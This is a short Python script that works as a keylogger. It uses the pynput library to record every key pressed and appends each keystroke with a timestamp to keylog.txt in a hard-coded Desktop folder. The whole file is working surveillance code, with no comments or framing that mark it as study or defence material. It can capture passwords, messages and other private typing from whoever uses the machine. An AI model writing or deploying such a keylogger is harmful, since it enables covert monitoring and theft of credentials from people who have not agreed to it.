#!/usr/bin/python3
from pynput.keyboard import Listener
import logging
import os

# Define log directory
log_dir = "/home/codekartel/Desktop/"  # Use the absolute path here

# Configure logging
logging.basicConfig(
    filename=os.path.join(log_dir, "keylog.txt"),  # Use os.path.join for reliable path formatting
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    logging.info(str(key))

# Start listening to keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()
